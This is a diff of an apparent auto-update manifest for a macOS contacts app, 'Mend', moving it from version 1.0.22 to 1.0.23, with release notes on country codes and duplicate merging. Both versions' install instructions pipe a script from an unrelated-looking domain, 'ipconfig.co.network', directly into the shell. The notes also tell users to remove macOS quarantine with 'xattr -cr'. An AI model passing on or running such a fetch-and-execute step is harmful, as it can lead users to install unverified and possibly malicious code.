@@ -1,14 +1,14 @@
 {
-  "version": "1.0.22",
-  "notes": "## Mend 1.0.22 — 07 Nov 2026\n\n- **Every number gets its own country code, and Mend no longer asks for yours.** For a number written without a code, Mend looks at the contact first: their other numbers written with +, their address, their email's country domain. A number that is real there gets that country's code, so a UK contact's number becomes +44 even when it would also pass as Indian. Only when the contact points nowhere does Mend use this Mac's own country (from its Region setting). A number that is real in none of these is left exactly as written. Each fix says where its country came from. The \"Your country code\" box and the country code choice are gone from Fix and Numbers.\n\n### Install\n\n- **macOS on Apple silicon** (M1 and newer): `curl -fsSL https://ipconfig.co.network/pour/install | sh` then `pour install --cask mend`\n\nFirst launch on macOS after a manual DMG install: `xattr -cr /Applications/Mend.app` (Mend is ad-hoc signed, not notarized).",
-  "pub_date": "2026-11-07T03:09:26Z",
+  "version": "1.0.23",
+  "notes": "## Mend 1.0.23 — 07 Nov 2026\n\n- **Duplicates are cards that share a mobile number, and nothing else.** A matching name, a shared email, a shared office line, a fax or a pager no longer makes two cards one person. Whether a number is a mobile comes from its label (mobile, cell, iPhone), or else from Google's numbering rules.\n- **A better Duplicates tab.** Each group shows the mobile number its cards share. Click a card to keep its name and photo; it's marked \"keep\". **Preview** shows the merged card before you merge, including the note listing every card. **Not the same person** keeps a group apart for good (there is a way to show them again). A search box finds a group by name or number. **Undo** puts the last merge back into separate cards.\n- **Merge all saves in one go.** On big lists it no longer saves group by group, which froze the window, and it says how many people and cards it merged.\n\n### Install\n\n- **macOS on Apple silicon** (M1 and newer): `curl -fsSL https://ipconfig.co.network/pour/install | sh` then `pour install --cask mend`\n\nFirst launch on macOS after a manual DMG install: `xattr -cr /Applications/Mend.app` (Mend is ad-hoc signed, not notarized).",
+  "pub_date": "2026-11-07T09:37:56Z",
   "platforms": {
     "darwin-aarch64": {
-      "signature": "dW50cnVzdGVkIGNvbW1lbnQ6IHNpZ25hdHVyZSBmcm9tIHRhdXJpIHNlY3JldCBrZXkKUlVUSUVLMDNkb2V5SDNYd2paL3p2VTEzNlJIZ0NQKzVrMVhTeDZIVXVTaTRYK3BFeHRRb3h1NkY4RDFPQnZ4bXhVYkt2SzE2UzdaUzFwc1lxMlR1ckJ2eUlTR1Y2QnZkRmc0PQp0cnVzdGVkIGNvbW1lbnQ6IHRpbWVzdGFtcDoxNzk0MDIwOTM3CWZpbGU6TWVuZC5hcHAudGFyLmd6CXZlcnNpb246MS4wLjIyCldFK2V3UkNiOXd5OFpmdzZkblVuWDZ3R2RnNXAxNUc3TDlTUHhuYlZGdFg3QzYreXdYWTJ4c1UzYTBwYUtEN09qY2tqQnNWVzE3M3cvc1huTEtvRER3PT0K",
-      "url": "https://github.com/JKS-sys/mend-08-oct-2026-releases/releases/download/v1.0.22/Mend_aarch64.app.tar.gz"
+      "signature": "dW50cnVzdGVkIGNvbW1lbnQ6IHNpZ25hdHVyZSBmcm9tIHRhdXJpIHNlY3JldCBrZXkKUlVUSUVLMDNkb2V5SDFxS3RjZnpOOG5PT25jTjFZTys3ZVFxOXY3OURNSUpHd1pLWm0rNnFUdEJ6N2tPYXRlRE1EV3FjMDlaYTVFSHRrRFlBSGV1Z0MvUGhlbENjMnZGMHdBPQp0cnVzdGVkIGNvbW1lbnQ6IHRpbWVzdGFtcDoxNzk0MDQ0MjMwCWZpbGU6TWVuZC5hcHAudGFyLmd6CXZlcnNpb246MS4wLjIzCmx1WFNBbHNKcHRwTDhCZTdkMm4wM2JTZE8xNEx1QXRuTW44NkswdHRTT00wWjE5aUo1Y1VHdlhQbS9kRThUNkZYUk56ZURMWWtXQ1VIQlhJRjByMEF3PT0K",
+      "url": "https://github.com/JKS-sys/mend-08-oct-2026-releases/releases/download/v1.0.23/Mend_aarch64.app.tar.gz"
     }
   },
   "downloads": {
-    "mac_arm": "Mend_1.0.22_aarch64.dmg"
+    "mac_arm": "Mend_1.0.23_aarch64.dmg"
   }
 }
